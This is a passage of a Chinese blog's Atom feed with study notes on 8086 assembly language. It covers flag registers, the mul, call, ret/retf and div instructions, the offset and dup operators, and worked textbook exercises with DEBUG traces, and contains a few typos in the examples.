class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,98H</span><br><span class="line">add al,al执行后：（al）=30H，CF=1，CF记录了从最高有效位向更高位的进位值</span><br><span class="line">add al,al执行后：（al）=60H，CF=0</span><br></pre></td></tr></table></figure></p><p>而当两个数据做减法的时候，有可能向更高位借位，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,97H</span><br><span class="line">sub al,98H；执行后（al）=FFH，CF=1，CF记录了向更高位的借位值</span><br><span class="line">sub al,al：执行后（al）=0，CF=0，CF记录了向更高位借位值</span><br></pre></td></tr></table></figure></p><h2 id="OF标志位"><a href="#OF标志位" class="headerlink" title="OF标志位"></a>OF标志位</h2><p>flag的第十一位是OF，溢出标志位。一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生溢出，OF=1；如果没有，OF=0.<br>对于无符号数运算，98+99没有进位，CF=0；<br>对于有符号数运算，98+99发生溢出，OF=1<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,F0H</span><br><span class="line">add al,88H</span><br></pre></td></tr></table></figure></p><p>add指令执行后：CF=1，OF=0.对于无符号运算，F0H+78H有进位，CF=1；<br>对于有符号数运算，F0H+78H不发生溢出，OF=0</p><h2 id="DF标志位"><a href="#DF标志位" class="headerlink" title="DF标志位"></a>DF标志位</h2><p>flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si，di的增减。<br>df=0 每次操作后si、di递增<br>df=1 每次操作后si、di递减</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;标志寄存器（简称flag）的作用：&lt;br&gt;（1）用来存储相关指令的某些执行结果。&lt;br&gt;（2）用来为CPU执行相关指令提供行为依据。&lt;br&gt;（3）用来控制CPU的相关工作方式。&lt;br&gt;flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而fl
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>mul指令</title>
    <link href="http://yoursite.com/2018/09/16/mul%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/09/16/mul指令/</id>
    <published>2018-09-16T02:58:12.000Z</published>
    <updated>2018-09-16T03:22:06.182Z</updated>
    
    <content type="html"><![CDATA[<p>mul指令是乘法指令<br>规定：<br>（1）两个项城的数，要么都是8位，要么都是16位，如果是8位，一个默认放在AL中，另一个放在8位reg或内存字单元中：如果是16位，一个默认放在AX中，另一个放在16位reg或内存子单元中。<br>（2）结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认放在DX中存放，低位在AX中放。</p><p>例如：<br>（1）计算100*10<br>100和10 都小于255，可以做8位陈发，程序如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,100</span><br><span class="line">mov bl,10</span><br><span class="line">mul bl</span><br></pre></td></tr></table></figure></p><p>结果（ax）=1000（03E8H）<br>（2）计算100*10000<br>100小于255，可10000大于255，所以必须做16位乘法，程序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,100</span><br><span class="line">mov bx,10000</span><br><span class="line">mul bx</span><br></pre></td></tr></table></figure></p><p>结果：(ax)=4240H,(dx)=000FH (F4240H=100000)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;mul指令是乘法指令&lt;br&gt;规定：&lt;br&gt;（1）两个项城的数，要么都是8位，要么都是16位，如果是8位，一个默认放在AL中，另一个放在8位reg或内存字单元中：如果是16位，一个默认放在AX中，另一个放在16位reg或内存子单元中。&lt;br&gt;（2）结果：如果是8位乘法，结果默
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>call指令</title>
    <link href="http://yoursite.com/2018/09/12/call%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/09/12/call指令/</id>
    <published>2018-09-12T12:12:52.000Z</published>
    <updated>2018-09-16T08:09:45.700Z</updated>
    
    <content type="html"><![CDATA[<p>CPU执行call指令时，进行两步操作：<br>（1）将当前的IP或CS和IP压入栈中；<br>（2）转移<br>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。</p><h2 id="call-标号"><a href="#call-标号" class="headerlink" title="call 标号"></a>call 标号</h2><h3 id="依据位移进行转移的call指令"><a href="#依据位移进行转移的call指令" class="headerlink" title="依据位移进行转移的call指令"></a>依据位移进行转移的call指令</h3><p>CPU执行 “call 标号”指令时，进行如下操作：<br>（1）(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>(2) (IP)=(IP)+16位位移。</p><p>16位位移=标号处的地址-call指令后的第一个直接的地址；<br>16位位移的范围为-32768~32767，用补码表示；<br>16位位移由编译程序在编译时算出。</p><p>CPU执行”call 标号”时，用汇编语言解释，相当于进行：<br>push IP<br>jmp near ptr 标号</p><h2 id="call-far-ptr-标号"><a href="#call-far-ptr-标号" class="headerlink" title="call far ptr 标号"></a>call far ptr 标号</h2><h3 id="转移的目的之地在指令中的call指令"><a href="#转移的目的之地在指令中的call指令" class="headerlink" title="转移的目的之地在指令中的call指令"></a>转移的目的之地在指令中的call指令</h3><p>CPU执行”call far ptr 标号”指令时，进行如下的操作：<br>(1) (sp)=(sp)-2<br>((ss)*16+（sp))=(CS)</p><p>(sp)=(sp)-2<br>((ss)*16+(sp0=（IP）<br>(2)(CS)=标号所在段的段地址<br>（IP）=标号在段中的偏移地址</p><p>CPU执行”call far ptr 标号”时，用汇编语言解释，相当于进行：<br>push CS<br>push IP<br>jmp far ptr 标号</p><h2 id="call-16-位-reg"><a href="#call-16-位-reg" class="headerlink" title="call 16 位 reg"></a>call 16 位 reg</h2><h3 id="转移地址在寄存器中的call指令"><a href="#转移地址在寄存器中的call指令" class="headerlink" title="转移地址在寄存器中的call指令"></a>转移地址在寄存器中的call指令</h3><p>功能：<br>(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>(IP)=(16位reg)</p><p>用汇编语言解释，相当于进行：<br>push IP<br>jmp 16位 reg</p><h2 id="call-word-ptr-内存单元地址"><a href="#call-word-ptr-内存单元地址" class="headerlink" title="call word ptr 内存单元地址"></a>call word ptr 内存单元地址</h2><p>转移地址在内存中的call指令</p><p>用汇编语言解释，相当于进行：<br>push IP<br>jmp word ptr 内存单元地址</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov as,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">call word ptr ds:[0]</span><br></pre></td></tr></table></figure></p><p>执行后，（IP）=0123H，（sp）=0EH</p><h2 id="call-dword-ptr-内存单元地址"><a href="#call-dword-ptr-内存单元地址" class="headerlink" title="call dword ptr 内存单元地址"></a>call dword ptr 内存单元地址</h2><p>转移地址在内存中的call指令</p><p>用汇编语言解释，相当于进行：<br>push CS<br>push IP<br>jmp word ptr 内存单元地址</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov as,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">call dword ptr ds:[0]</span><br></pre></td></tr></table></figure></p><p>执行后，（CS）=0，（IP）=0123H，（sp）=0CH</p><h2 id="call和ret的配合使用"><a href="#call和ret的配合使用" class="headerlink" title="call和ret的配合使用"></a>call和ret的配合使用</h2><p>call和ret配合使用来实现子程序<br>先分析一下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start: mov ax,1</span><br><span class="line">   mov cx,3</span><br><span class="line">   call s</span><br><span class="line">   mov bx,ax</span><br><span class="line">   mov ax,4c00h</span><br><span class="line">   int 21h</span><br><span class="line">    s: add ax,bx</span><br><span class="line">   loops</span><br><span class="line">   ret</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>CPU执行这个程序的主要过程<br><img src="https://i.imgur.com/hzLJVqo.png" alt=""><br>可以写一个具有一定功能的程序段，我们称其为子程序，在需要的时候，用call指令去执行。可是执行完子程序后，如何让CPU接着call指令向下执行？call指令去执行子程序之前，call指令后面的指令的地址将存储在栈中，所以可在子程序后面使用ret指令，用栈中的数据设置IP的值，从而转到call指令后面的代码处继续执行。</p><p>具有子程序的源程序的框架如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">main: :</span><br><span class="line">  :</span><br><span class="line">  call sub1</span><br><span class="line">  :</span><br><span class="line">  :</span><br><span class="line">  mov ax,4c00h</span><br><span class="line">  int 21h</span><br><span class="line">sub1: :</span><br><span class="line">  :</span><br><span class="line">  call sub2</span><br><span class="line">  :</span><br><span class="line">  :</span><br><span class="line">  ret</span><br><span class="line">sub2: :</span><br><span class="line">  :</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end main</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CPU执行call指令时，进行两步操作：&lt;br&gt;（1）将当前的IP或CS和IP压入栈中；&lt;br&gt;（2）转移&lt;br&gt;call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。&lt;/p&gt;
&lt;h2 id=&quot;call-标号&quot;&gt;&lt;a href=&quot;#call
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>检测点10.1-10.5</title>
    <link href="http://yoursite.com/2018/09/12/%E6%A3%80%E6%B5%8B%E7%82%B910-1-10-5/"/>
    <id>http://yoursite.com/2018/09/12/检测点10-1-10-5/</id>
    <published>2018-09-12T12:08:33.000Z</published>
    <updated>2018-09-16T02:21:35.910Z</updated>
    
    <content type="html"><![CDATA[<h2 id="10-1"><a href="#10-1" class="headerlink" title="10.1"></a>10.1</h2><p>补全程序，实现从内存1000:0000处开始执行指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">start: mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line">mov ax,0</span><br><span class="line">push ax</span><br><span class="line">mov ax,1000h</span><br><span class="line">retf</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>程序分析：</p><ol><li><p>retf指令作用（CPU角度）：从栈中弹出2个字单元，并修改CS（第二个字）和IP（第一个字）；首先它弹出的是IP，其次是CS，故在压栈时，CS的值首先入栈，IP再入栈。</p><p> 在汇编编程角度，retf实现了远转移。</p></li></ol><p>讲解：在汇编代码这个层次，retf指令作用是修改CS和IP的值，进而使指令从修改后的地址处开始执行。由于它所依赖的是栈中存储的内容，故在压栈过程中要搞清楚入栈的顺序、入栈的值。</p><p>2.熟悉ret指令和RETF指令执行的操作。</p><p>我们编译链接后，debug跟踪check10-1.exe</p><p>-d ss:0</p><p>0B66:0000  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   …………….</p><p>在stack数据区中初始化了16个0，此时它未成为栈结构。直到初始化栈的结构。</p><p>执行代码t t（二次）</p><p>AX=0B66  BX=0000  CX=0026  DX=0000  SP=0010  BP=0000  SI=0000  DI=0000</p><p>DS=0B56  ES=0B56  SS=0B66  CS=0B67  IP=0008   NV UP EI PL NZ NA PO NC</p><p>0B67:0008 B80010        MOV     AX,1000</p><p>-d ss:00</p><p>0B66:0000  00 00 00 00 00 00 66 0B-00 00 08 00 67 0B 68 05   ……f…..g.h.</p><p>初始化一个栈sp=0010H（16），栈地址：ss=0b66，这里我们发现一些不应该有的数据（不理会它，它是中断的信息）</p><p>继续执行代码：</p><p>-d ss:0</p><p>0B66:0000  00 00 00 00 00 00 10 00-67 0B 68 05 00 00 00 10   ……..g.h…..</p><p>发现从高位开始存储10 00 00 00四个字节的数据，（体会栈是从高地址向低地址发展的，sp指针从10H减少到了0cH）</p><p>此时的CS=0B67  IP=0010</p><p>执行retf代码：</p><p>我们发现：CS=1000  IP=0000，CS和IP的值改变了。</p><p>总结：ret和RETF依赖于栈的结构存储一个程序执行点（IP或CS和IP），当执行这个代码时，可以恢复到这个程序的执行点（将栈中的数据修改IP或CS和IP，使CPU指向新的CS：IP）</p><h2 id="10-2"><a href="#10-2" class="headerlink" title="10.2"></a>10.2</h2><p>下面的程序执行后，ax中的数值为多少？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">内存地址    机器码      汇编指令       执行后情况</span><br><span class="line"></span><br><span class="line">1000:0     b8 00 00     mov ax,0     ax=0 ip指向1000:3</span><br><span class="line"></span><br><span class="line">1000:3     e8 01 00     call s       读取指令后IP指向下一条指令IP为6;push 6</span><br><span class="line"></span><br><span class="line">1000:6     40           inc ax</span><br><span class="line"></span><br><span class="line">1000:7     58         s:pop ax       ax=6</span><br></pre></td></tr></table></figure></p><p> “call 标号”是将该指令后的第一个字节偏移地址入栈，再转到标号处执行指令。</p><h2 id="10-3"><a href="#10-3" class="headerlink" title="10.3"></a>10.3</h2><p>下面的程序执行后，AX中的数值为多少？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">内存地址        机器码               汇编指令  </span><br><span class="line"></span><br><span class="line">1000：0       b8 00 00             mov ax,0  </span><br><span class="line"></span><br><span class="line">1000：3       9A 09 00 00 10       call far ptr s    ;cs为1000h，ip为8，</span><br><span class="line">                                                      push 1000h，push 8</span><br><span class="line">1000：8       40                   inc ax   </span><br><span class="line">1000：9       58                   s:  pop ax        ;ax=8h  </span><br><span class="line">                                       add ax,ax     ;ax=10h  </span><br><span class="line">                                       pop bx        ;bx=1000h  </span><br><span class="line">                                       add ax,bx     ;ax=1010h</span><br></pre></td></tr></table></figure></p><p>执行call far ptr s时，取IP为8,add ax,ax    ax=16<br>BX=CS=1000H 相加转16进制ax=1010H</p><h2 id="10-4"><a href="#10-4" class="headerlink" title="10.4"></a>10.4</h2><p>下面的程序执行后，AX中的数值为多少？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">内存地址        机器码          汇编指令   </span><br><span class="line">1000：0       b8 06 00        mov ax,6   </span><br><span class="line">1000：3       ff d0           call ax</span><br><span class="line">1000：5       40              inc ax   </span><br><span class="line">1000：6                       mov bp,sp  </span><br><span class="line">                              add ax,[bp]</span><br></pre></td></tr></table></figure></p><p>在执行了<br>call ax<br>的时候<br>指令寄存器会指向下一条指令的起始地址，也就是<br>1000:5 inc ax<br>然后指令寄存器ip=5要压入堆栈<br>然后跳转到cs:ax指定的地址执行<br>又因为此时ax中的值为6 ,cs=1000<br>所以跳转到1000:6执行<br>于是修改 ip为6<br>到此时call ax指令才执行完毕</p><p>然后就执行<br>mov bp,sp<br>因为sp里面放的是堆顶的地址，所以bp也是栈顶的地址了<br>之后<br>add ax,[bp]<br>因为，bp里面放的是栈顶的地址，所以 [bp] 寄存器寻址后 [bp]实际是代表该地址单元的内容，也就是栈顶的内容，因为先前我把ip压入了堆栈，所以[bp]得到的内容就是5(先前在call ax时候压入的ip的值)</p><p>所以 ax=ax+[bp]<br>也就是 ax=6+5=0BH</p><h2 id="10-5"><a href="#10-5" class="headerlink" title="10.5"></a>10.5</h2><p>题目：下面的程序执行后，ax中的数据是多少？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code </span><br><span class="line">stack segment </span><br><span class="line">dw 8 dup (0) </span><br><span class="line">stack ends </span><br><span class="line"></span><br><span class="line">code segment </span><br><span class="line">start :mov ax,stack </span><br><span class="line">       mov ss,ax </span><br><span class="line">      mov sp,16        </span><br><span class="line"></span><br><span class="line">      mov ds,ax       </span><br><span class="line">      mov ax,0  </span><br><span class="line">      call word ptr ds:[0eH]     </span><br><span class="line">      inc ax </span><br><span class="line">      inc ax </span><br><span class="line">      inc ax </span><br><span class="line">code ends </span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>解答：刚开始时mov ax,stack到mov sp,10h是分别设置ss：sp指向程序中定义的栈段stack。mov ds,ax也把数据段的段地址也设置成了stack段的段地址。call word prt ds:[0Eh]相当于是sp=sp-2，push ip，jmp word ptr ds:[0Eh]这三条指令。而sp-2就是0Eh了，push ip就是把第一条inc ax对应的ip值给压入栈。存放在ss:[0Eh]和ss:[0Fh]里面。接下来是jmp word ptr ds:[0Eh]了，它的功能就是把stack段的[0eh]子单元的值付给ip，很巧的是stack中[0eh]字单元的值就是刚刚压入的ip值。所以ip值没有改变。程序继续执行inc ax后面的程序。所以ax的值是3.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;10-1&quot;&gt;&lt;a href=&quot;#10-1&quot; class=&quot;headerlink&quot; title=&quot;10.1&quot;&gt;&lt;/a&gt;10.1&lt;/h2&gt;&lt;p&gt;补全程序，实现从内存1000:0000处开始执行指令&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>ret和retf</title>
    <link href="http://yoursite.com/2018/09/12/ret%E5%92%8Cretf/"/>
    <id>http://yoursite.com/2018/09/12/ret和retf/</id>
    <published>2018-09-12T11:44:58.000Z</published>
    <updated>2018-09-12T12:41:28.642Z</updated>
    
    <content type="html"><![CDATA[<p>ret指令用栈中的数据，修改IP的内容，从而实现进转移；<br>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移；</p><p>CPU执行ret指令时，进行下面两步操作：<br>（1） （IP)=((ss)*16+(sp))<br>（2） (sp)=(sp)+2</p><p>CPU执行retf指令时，进行下面4部操作：<br>(1) (IP)=((ss)<em>16+(sp))<br>(2) (sp)=(sp)+2<br>(3) (CS)=((ss)</em>16+(sp))<br>(4) (sp)=(sp)+2</p><p>可以看出，CPU执行ret指令时，相当于进行：<br>pop IP</p><p>CPU执行retf指令时，相当于进行：<br>pop IP<br>pop CS</p><p>例如：<br>1、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">start: mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line">mov ax,0</span><br><span class="line">push ax</span><br><span class="line">mov bx,0</span><br><span class="line">ret</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>ret指令执行后CS：IP指向代码的第一条指令<br>2、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs;code</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">start: mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line">mov ax,0</span><br><span class="line">push cs</span><br><span class="line">push ax</span><br><span class="line">mov bx,0</span><br><span class="line">retf</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>retf指令执行后，CS：IP指向代码段的第一条指令。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ret指令用栈中的数据，修改IP的内容，从而实现进转移；&lt;br&gt;retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移；&lt;/p&gt;
&lt;p&gt;CPU执行ret指令时，进行下面两步操作：&lt;br&gt;（1） （IP)=((ss)*16+(sp))&lt;br&gt;（2） (sp)=(sp)
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>操作符offset</title>
    <link href="http://yoursite.com/2018/09/11/%E6%93%8D%E4%BD%9C%E7%AC%A6offset/"/>
    <id>http://yoursite.com/2018/09/11/操作符offset/</id>
    <published>2018-09-11T13:26:03.000Z</published>
    <updated>2018-09-11T13:44:54.175Z</updated>
    
    <content type="html"><![CDATA[<p>操作符offest在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,offset strat      ;相当于mov ax,0</span><br><span class="line">s: mov ax,offset s             ;相当于mov ax,3</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>offset操作符取得了标号start和s的偏移地址0和3<br>因为start是代码段中的标号，它所标记的指令是代码段中的第一条指令，偏移地址为0；<br>而s标记的指令是代码段中的第二条指令，第一条指令长度为3个字节，则s的偏移地址为3.</p><p>又比如：<img src="https://i.imgur.com/hPg1Fmt.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;操作符offest在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。比如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>dup指令</title>
    <link href="http://yoursite.com/2018/09/11/dup%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/09/11/dup指令/</id>
    <published>2018-09-11T13:04:52.000Z</published>
    <updated>2018-09-11T13:15:28.797Z</updated>
    
    <content type="html"><![CDATA[<p>dup是一个操作符，在汇编语言中同db、dw、dd、等一样。它是和db、dw、dd、等数据定义伪指令配合使用的，用来数据的重复。<br>dup的使用格式如下：<br>db 重复的次数 dup （重复的字节型数据）<br>dw 重复的次数 dup （重复的字型数据）<br>dd 重复的次数 dup （重复的双字符数据）</p><p>比如：<br>1、<br><figure class="highlight plain"><figcaption><span>3 dup (0)```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">定义了三个字节，它们的值都是0，相当于db 0,0,0。</span><br><span class="line"></span><br><span class="line">2、</span><br></pre></td></tr></table></figure></p><p>stack segment<br>db 200 dup (0)<br>stack ends<br><code>`</code><br>定义了一个容量为200个字节的栈段</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;dup是一个操作符，在汇编语言中同db、dw、dd、等一样。它是和db、dw、dd、等数据定义伪指令配合使用的，用来数据的重复。&lt;br&gt;dup的使用格式如下：&lt;br&gt;db 重复的次数 dup （重复的字节型数据）&lt;br&gt;dw 重复的次数 dup （重复的字型数据）&lt;br&gt;d
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>div指令</title>
    <link href="http://yoursite.com/2018/09/11/div%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/09/11/div指令/</id>
    <published>2018-09-11T11:48:19.000Z</published>
    <updated>2018-09-11T13:03:34.063Z</updated>
    
    <content type="html"><![CDATA[<p>div是除法指令，使用div做除法时应注意以下问题。</p><p>1、除数：有8位和16位两种，在一个reg或内存单元中。<br>2、被除数：默认放在AX或DX和AX中，如果除数位8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中存放，DX放高16位，AX存放低16位。<br>3、结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；<br>如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。</p><p>例如：<br>1、除数为8位：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div byte ptr ds:[0]</span><br></pre></td></tr></table></figure><p>含义：（al）=（ax）/（（ds）*16+0）的商</p><p>（ah）=（ax）/（ds)*16+0)的余数</p><p>2、除数为16位：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div word ptr es:[0]</span><br></pre></td></tr></table></figure><p>含义：(ax)=[(dx)*10000H+(ax)] /</p><p>((es)*16+0)的商</p><p>（dx）=[(dx)*10000H+(ax)] / </p><p>(es)*16+0)的余数</p><p>3、用除法指令计算100001/100</p><p>分析：被除数100001大于65535（ffffh），所以用dx和ax两个寄存器联合存放100001，除数100虽然小于255可以在一个8位寄存器中存放，但是，因为除数是32位的，除数应为16位，所以要用16位寄存器存放除数100<br>100001表示为16进制为：186A1H。程序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 